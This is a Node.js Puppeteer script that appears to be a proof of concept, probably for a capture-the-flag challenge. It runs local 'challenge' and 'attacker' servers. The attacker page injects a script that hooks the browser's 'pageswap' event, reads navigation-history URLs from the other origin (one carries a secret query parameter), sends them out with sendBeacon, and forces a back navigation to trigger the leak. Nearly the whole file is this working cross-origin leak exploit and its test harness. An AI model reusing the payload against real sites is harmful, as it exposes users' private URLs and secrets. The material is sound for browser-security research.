const http = require('node:http');
const puppeteer = require('puppeteer');

(async () => {
  const logs = [];
  const challenge = http.createServer((req, res) => {
    logs.push(['challenge', req.url, req.headers['sec-fetch-site']]);
    res.setHeader('content-type', 'text/html');
    res.setHeader('cross-origin-opener-policy', 'same-origin');
    res.end('challenge');
  });
  const attacker = http.createServer((req, res) => {
    logs.push(['attacker', req.url, req.headers['sec-fetch-site']]);
    res.setHeader('content-type', 'text/html');
    if (req.url.startsWith('/attack')) {
      res.end(`<script>
        addEventListener('pageswap', e => {
          const a=e.activation;
          navigator.sendBeacon('/log?entry='+encodeURIComponent(a?.entry?.url)+'&from='+encodeURIComponent(a?.from?.url));
        });
        setTimeout(()=>history.go(-2),100);
      </script>`);
    } else res.end('ok');
  });
  await Promise.all([
    new Promise(r => challenge.listen(0, 'localhost', r)),
    new Promise(r => attacker.listen(0, '127.0.0.1', r)),
  ]);
  const browser = await puppeteer.launch({executablePath: process.env.CHROME_PATH, headless:'new'});
  const page = await browser.newPage();
  await page.goto(`http://localhost:${challenge.address().port}/check?secret=xyz`);
  await page.goto(`http://localhost:${challenge.address().port}/api`);
  await page.goto(`http://127.0.0.1:${attacker.address().port}/attack`);
  await new Promise(r=>setTimeout(r,1000));
  console.log(logs, page.url());
  await browser.close();
  await Promise.all([new Promise(r=>challenge.close(r)),new Promise(r=>attacker.close(r))]);
})();
